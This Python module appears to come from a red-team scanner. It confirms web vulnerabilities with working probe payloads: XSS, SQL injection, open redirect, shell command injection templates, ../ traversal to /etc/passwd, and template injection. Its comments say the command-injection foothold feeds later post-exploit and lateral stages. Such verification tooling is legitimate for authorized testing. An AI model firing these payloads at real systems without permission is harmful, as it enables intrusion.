"""Exploit techniques for stage 1: bounded, non-destructive, self-verifying.

Each technique sends a small number of probes against a single request
parameter and decides whether the weakness is *proven* — never by heuristics
alone, but by an observable oracle in the response:

* **ReflectedXSS** — a unique marker injected into a parameter comes back
  unencoded in an HTML response (the payload would execute).
* **BooleanSQLi** — a true-condition and a false-condition payload produce
  materially different responses (a boolean oracle), while an error-condition
  payload surfaces a database error. No time-based or stacked queries (those
  risk DoS / writes); this is read-only boolean logic only.
* **OpenRedirect** — a benign external marker placed in a redirect parameter
  comes back in the ``Location`` header, so the endpoint redirects off-site.
* **CommandInjection** — an injected shell *arithmetic* oracle is evaluated by
  the target, proving execution without any destructive payload.
* **PathTraversal** — a bounded ``../`` sequence reaches a well-known, benign,
  read-only system file whose fixed public signature appears in the response.
  The oracle is only "a known benign public file is reachable via ``../``"; no
  sensitive content is parsed or exfiltrated.
* **SSTI** — an injected template expression computing a product of two
  distinctive constants is *evaluated* server-side (an arithmetic-reflection
  oracle exactly like CommandInjection), so a literal reflection of the payload
  is never mistaken for execution.

Payloads are proof markers, never destructive. The goal is a confirmed finding,
not damage: no data is modified, no query is stacked, nothing is deleted. The
traversal and SSTI techniques are stage-1 ONLY — they confirm a weakness with a
benign observable oracle and stop; they never write, delete, escalate, persist,
or set any context that drives the post-exploit / lateral stages (only a
sequence-capable command-injection foothold does that).
"""

from __future__ import annotations

from dataclasses import dataclass, field
from typing import Dict, List, Optional

from aegis.redteam.http import HttpResponse, Transport, sanitize_text

# A unique, inert marker so a reflection/redirect is unambiguously *ours*.
MARKER = "aeg1s7k9z"


@dataclass
class Probe:
    method: str
    url: str
    params: Dict[str, str]
    label: str = ""


@dataclass
class VerifyResult:
    verified: bool
    technique: str
    cwe: str
    proof: str = ""                 # one-line human proof statement
    evidence: List[str] = field(default_factory=list)
    requests: int = 0
    # Carries what a stage-2 post-exploit step needs to reuse the foothold
    # (e.g. the working command-injection payload template). Empty otherwise.
    context: dict = field(default_factory=dict)


class Technique:
    name: str = ""
    cwe: str = ""
    # Candidate CWEs / finding keywords this technique can try to confirm.
    applies_cwes: tuple = ()
    applies_keywords: tuple = ()

    def applies_to(self, finding_kind: str) -> bool:
        k = (finding_kind or "").lower()
        if k in {self.name}:
            return True
        if any(c.lower() == k for c in self.applies_cwes):
            return True
        return any(w in k for w in self.applies_keywords)

    def run(self, transport: Transport, url: str, param: str) -> VerifyResult:
        raise NotImplementedError


class ReflectedXSS(Technique):
    name = "xss"
    cwe = "CWE-79"
    applies_cwes = ("CWE-79",)
    applies_keywords = ("xss", "cross-site script", "reflect")

    def run(self, transport: Transport, url: str, param: str) -> VerifyResult:
        payload = f"<svg/onload=alert('{MARKER}')>"
        resp = transport.send("GET", url, {param: payload})
        ev = [f"param {param!r} probed with a reflected-XSS marker"]
        verified = False
        if resp.ok and payload in resp.body:
            ctype = resp.header("content-type").lower()
            # Reflected verbatim into an HTML response → it would execute.
            if "html" in ctype or "<html" in resp.body.lower():
                verified = True
                ev.append(f"marker reflected UNENCODED in HTML response "
                          f"(status {resp.status})")
        elif resp.ok:
            ev.append("marker not reflected (encoded or filtered)")
        else:
            ev.append(f"request error: {resp.error or resp.status}")
        proof = (f"reflected XSS confirmed on {param!r}: payload echoed "
                 f"unencoded into HTML" if verified else "")
        return VerifyResult(verified, self.name, self.cwe, proof, ev, requests=1)


class BooleanSQLi(Technique):
    name = "sqli"
    cwe = "CWE-89"
    applies_cwes = ("CWE-89",)
    applies_keywords = ("sql inject", "sqli", "sql-injection")

    # Read-only boolean/error payloads only — never time-based or stacked.
    _TRUE = "' OR '1'='1"
    _FALSE = "' OR '1'='2"
    _ERR = "'"
    _SQL_ERRORS = ("sql syntax", "sqlite", "psql", "pg_query", "mysql_fetch",
                   "ora-0", "odbc", "syntax error at or near",
                   "unclosed quotation", "quoted string not properly terminated",
                   "you have an error in your sql syntax")

    def run(self, transport: Transport, url: str, param: str) -> VerifyResult:
        base = transport.send("GET", url, {param: MARKER})
        t = transport.send("GET", url, {param: MARKER + self._TRUE})
        f = transport.send("GET", url, {param: MARKER + self._FALSE})
        e = transport.send("GET", url, {param: MARKER + self._ERR})
        ev = [f"param {param!r} probed with boolean/error SQLi oracles"]
        verified = False
        proof = ""

        err_body = (e.body or "").lower()
        db_error = e.ok and any(s in err_body for s in self._SQL_ERRORS)
        if db_error:
            verified = True
            proof = f"SQL injection confirmed on {param!r}: a single quote elicits a DB error"
            ev.append("error oracle: injecting ' surfaced a database error string")

        # Boolean oracle: TRUE response matches baseline, FALSE differs clearly.
        if not verified and base.ok and t.ok and f.ok:
            same_true = _similar(base.body, t.body)
            diff_false = not _similar(t.body, f.body)
            if same_true and diff_false:
                verified = True
                proof = (f"SQL injection confirmed on {param!r}: a true/false "
                         f"condition flips the response (boolean oracle)")
                ev.append(f"boolean oracle: TRUE≈baseline (len {len(t.body)}), "
                          f"FALSE differs (len {len(f.body)})")
        if not verified:
            ev.append("no SQL error and no boolean oracle observed")
        return VerifyResult(verified, self.name, self.cwe, proof, ev, requests=4)


class OpenRedirect(Technique):
    name = "redirect"
    cwe = "CWE-601"
    applies_cwes = ("CWE-601",)
    applies_keywords = ("open redirect", "url redirect", "redirection")

    _TARGET = f"http://{MARKER}.invalid/"

    def run(self, transport: Transport, url: str, param: str) -> VerifyResult:
        resp = transport.send("GET", url, {param: self._TARGET})
        ev = [f"param {param!r} probed with an off-site redirect marker"]
        verified = False
        proof = ""
        loc = resp.header("location")
        safe_loc = sanitize_text(loc, limit=256)  # response data → never raw
        if 300 <= resp.status < 400 and loc:
            if MARKER in loc and ".invalid" in loc:
                verified = True
                proof = (f"open redirect confirmed on {param!r}: Location points "
                         f"to the attacker-supplied host")
                ev.append(f"{resp.status} redirect to Location: {safe_loc}")
            else:
                ev.append(f"redirects, but not to our marker (Location: {safe_loc})")
        else:
            ev.append(f"no off-site redirect (status {resp.status or resp.error})")
        return VerifyResult(verified, self.name, self.cwe, proof, ev, requests=1)


# Command-injection payload templates. ``seq`` means the separator can chain a
# whole command SEQUENCE (needed by stage-2 proof, which runs marker; cmd;
# marker); substitution forms run a single command only, so they confirm but do
# not drive stage-2 extraction. ``{cmd}`` is where a command is spliced.
_CMDI_TEMPLATES = (
    (";{cmd}", True),      # ; cmd
    ("\n{cmd}", True),     # newline cmd
    ("&&{cmd}", True),     # && cmd
    ("|{cmd}", True),      # | cmd
    ("$({cmd})", False),   # $(cmd)
    ("`{cmd}`", False),    # `cmd`
)


class CommandInjection(Technique):
    name = "cmdi"
    cwe = "CWE-78"
    applies_cwes = ("CWE-78",)
    applies_keywords = ("command inject", "os command", "cmdi", "rce",
                        "remote code")

    # Reflection-immune oracle: the injected command echoes a marker joined to
    # an ARITHMETIC result the shell must compute. A server that merely reflects
    # our input shows the literal `$((A*B))`; only actual execution shows the
    # product, so a reflect-and-execute target is still correctly confirmed.
    _A, _B = 1337, 7919

    def run(self, transport: Transport, url: str, param: str) -> VerifyResult:
        # Confirm read-only: `echo` + shell arithmetic changes nothing.
        ev = [f"param {param!r} probed with a command-injection arithmetic oracle"]
        token = f"{MARKER}ci"
        expect = f"{token}-{self._A * self._B}"       # e.g. aeg1s7k9zci-10587703
        requests = 0
        for tmpl, seq in _CMDI_TEMPLATES:
            inj = tmpl.format(cmd=f"echo {token}-$(({self._A}*{self._B}))")
            resp = transport.send("GET", url, {param: f"x{inj}"})
            requests += 1
            if resp.ok and expect in resp.body:
                # the product appears → the shell evaluated our arithmetic;
                # a reflected literal `$((..))` would not contain it.
                proof = (f"OS command injection confirmed on {param!r}: injected "
                         f"shell arithmetic was evaluated (syntax {tmpl!r})")
                ev.append(f"computed oracle {expect!r} observed (syntax {tmpl!r})")
                return VerifyResult(
                    True, self.name, self.cwe, proof, ev, requests=requests,
                    context={"template": tmpl, "seq": seq, "param": param})
        ev.append("no evaluated-command output observed")
        return VerifyResult(False, self.name, self.cwe, "", ev, requests=requests)


class PathTraversal(Technique):
    name = "traversal"
    cwe = "CWE-22"
    applies_cwes = ("CWE-22", "CWE-23", "CWE-36")
    applies_keywords = ("path traversal", "directory traversal", "traversal",
                        "lfi", "local file")

    # Benign, universally-present, read-only target. The oracle is a FIXED,
    # non-secret public signature — the standard super-user account line that
    # every POSIX ``/etc/passwd`` carries. We match only this content-free
    # signature; we never parse or report the file's contents (no exfiltration).
    _TARGET_FILE = "etc/passwd"
    _SIGNATURE = "root:x:0:0:"
    # Tiny, bounded probe set: a handful of traversal depths. Stops at the
    # first depth that reaches the file.
    _TRAVERSALS = (
        "../" * 1, "../" * 2, "../" * 3, "../" * 4, "../" * 6, "../" * 8,
    )

    def run(self, transport: Transport, url: str, param: str) -> VerifyResult:
        ev = [f"param {param!r} probed with a bounded ../ traversal to a "
              f"benign read-only system file"]
        requests = 0
        for trav in self._TRAVERSALS:
            payload = trav + self._TARGET_FILE
            resp = transport.send("GET", url, {param: payload})
            requests += 1
            # Oracle: the fixed public signature is present only if the server
            # actually read the file via our traversal. We do NOT echo any
            # response content into evidence (benign signature match only).
            if resp.ok and self._SIGNATURE in (resp.body or ""):
                depth = trav.count("../")
                proof = (f"path traversal confirmed on {param!r}: a benign "
                         f"read-only system file is reachable via ../")
                ev.append(f"benign signature {self._SIGNATURE!r} reached at "
                          f"depth {depth} (status {resp.status})")
                return VerifyResult(
                    True, self.name, self.cwe, proof, ev, requests=requests,
                    context={"param": param, "depth": depth,
                             "target_file": self._TARGET_FILE})
        ev.append("benign signature not reachable via ../ (no traversal)")
        return VerifyResult(False, self.name, self.cwe, "", ev,
                            requests=requests)


# Server-side template-injection syntaxes to try (tiny, bounded set covering the
# common engines). ``EXPR`` is spliced with the arithmetic oracle.
_SSTI_SYNTAXES = (
    "{{EXPR}}",       # Jinja2 / Twig / Nunjucks
    "${EXPR}",        # FreeMarker / JSP EL / Thymeleaf / Velocity
    "#{EXPR}",        # Ruby/Spring EL variants
    "<%= EXPR %>",    # ERB
    "{EXPR}",         # bare brace engines
)


class SSTI(Technique):
    name = "ssti"
    cwe = "CWE-1336"
    applies_cwes = ("CWE-1336", "CWE-94")
    applies_keywords = ("template inject", "ssti", "server-side template")

    # Reflection-immune oracle, exactly like CommandInjection: a MARKER token is
    # joined to a PRODUCT of two distinctive constants that the template engine
    # must compute. A server that merely reflects our payload shows the literal
    # expression (e.g. `{{7919*6421}}`); only actual evaluation yields the
    # product, so `token-<product>` appears only on real server-side execution.
    _A, _B = 7919, 6421

    def run(self, transport: Transport, url: str, param: str) -> VerifyResult:
        ev = [f"param {param!r} probed with a server-side template arithmetic "
              f"oracle"]
        token = f"{MARKER}ssti"
        expr = f"{self._A}*{self._B}"
        expect = f"{token}-{self._A * self._B}"   # e.g. aeg1s7k9zssti-50847899
        requests = 0
        for syntax in _SSTI_SYNTAXES:
            # token prefix is OUTSIDE the template braces; the product is INSIDE.
            inj = f"{token}-" + syntax.replace("EXPR", expr)
            resp = transport.send("GET", url, {param: inj})
            requests += 1
            if resp.ok and expect in (resp.body or ""):
                # the product appears joined to our token → the template engine
                # evaluated our expression; a reflected literal `{{A*B}}` (or
                # `${A*B}`, …) would show the operands, never the product.
                proof = (f"server-side template injection confirmed on "
                         f"{param!r}: injected template arithmetic was "
                         f"evaluated (syntax {syntax!r})")
                ev.append(f"computed oracle {expect!r} observed (syntax "
                          f"{syntax!r})")
                return VerifyResult(
                    True, self.name, self.cwe, proof, ev, requests=requests,
                    context={"param": param, "syntax": syntax})
        ev.append("no evaluated-template output observed (literal reflection "
                  "does not confirm)")
        return VerifyResult(False, self.name, self.cwe, "", ev,
                            requests=requests)


def _similar(a: str, b: str) -> bool:
    """Cheap response-similarity oracle for boolean SQLi.

    True when two response bodies are close in length (within 5% or 64 bytes) —
    enough to tell a true-condition page (≈ baseline) from a false-condition one
    (empty/short/different) without a heavyweight diff.
    """
    la, lb = len(a or ""), len(b or "")
    if la == lb:
        return True
    hi = max(la, lb) or 1
    return abs(la - lb) <= max(64, int(0.05 * hi))


ALL_TECHNIQUES = (ReflectedXSS(), BooleanSQLi(), OpenRedirect(),
                  CommandInjection(), PathTraversal(), SSTI())


def technique_for(finding_kind: str) -> Optional[Technique]:
    for t in ALL_TECHNIQUES:
        if t.applies_to(finding_kind):
            return t
    return None


__all__ = ["MARKER", "Probe", "VerifyResult", "Technique", "ReflectedXSS",
           "BooleanSQLi", "OpenRedirect", "CommandInjection", "PathTraversal",
           "SSTI", "_CMDI_TEMPLATES", "_SSTI_SYNTAXES", "ALL_TECHNIQUES",
           "technique_for"]
